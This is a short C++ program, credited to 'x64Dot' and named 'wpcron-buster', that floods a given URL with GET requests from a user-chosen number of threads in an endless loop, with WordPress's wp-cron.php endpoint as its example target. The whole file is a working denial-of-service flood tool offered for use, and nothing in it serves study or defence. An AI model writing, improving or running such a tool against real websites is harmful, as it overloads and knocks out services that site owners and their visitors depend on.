#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <thread>
#include <mutex> 

using namespace std;

size_t discard_data(void *ptr, size_t size, size_t nmemb, void *userdata);
void send_GET(const string& url, bool ssl);

mutex mtx;

int main(int argc, char* argv[]) {
    if (argc != 3) {
        cout << "wpcron-buster : Written by x64Dot\n ";
        cout << "Syntax: {program_name} {url} {threads} \n";
        cout << "Example: " << argv[0] << " http://example.com/wp-cron.php\n";
        return 1;
    }

    string url = argv[1];

    
    const int num_threads = atoi(argv[2]); 
    vector<thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        threads.emplace_back(send_GET, url, url.rfind("https", 0) == 0);
    }

    for (auto& thread : threads) {
        thread.join();
    }

    return 0;
}

size_t discard_data(void *ptr, size_t size, size_t nmemb, void *userdata) {

    return size * nmemb; 
}

void send_GET(const string& url, bool ssl) {
    static int counter = 0;
    CURL *curl = curl_easy_init();

    if (curl) {
        while (true) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data);

            if (ssl) {
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
            }

            curl_easy_perform(curl);

            {
               lock_guard<mutex> lock(mtx); 
                if (counter == 0) {
                    cout << "Do CTRL C to stop the program." << endl;
                }

                counter++;
                
                cout << "\rGET requests sent: " << counter << flush;
            }
        }

        curl_easy_cleanup(curl);
    }
}
